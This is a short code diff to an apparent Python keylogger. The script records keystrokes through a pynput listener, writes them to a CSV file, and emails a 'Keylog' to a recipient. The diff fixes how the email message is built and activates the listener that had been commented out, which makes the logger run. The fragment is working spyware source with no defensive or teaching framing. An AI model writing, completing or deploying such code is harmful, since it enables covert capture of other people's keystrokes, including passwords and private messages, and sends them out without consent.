@@ -39,7 +39,7 @@ def on_press(key):
 #Mailing to the resipirnt address
 def email():
     global Today_date
-    message = "This the Keylog for the Date:",Today_date
+    message = "This the Keylog for the Date:" + Today_date
     send_email.sendEmail(message)
 
 #Writing the data in the csv file 
@@ -59,6 +59,5 @@ def on_release(key):
     if key == Key.end:
         return False
 
-
-# with Listener(on_press = on_press, on_release = on_release) as listener:
-#     listener.join()
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
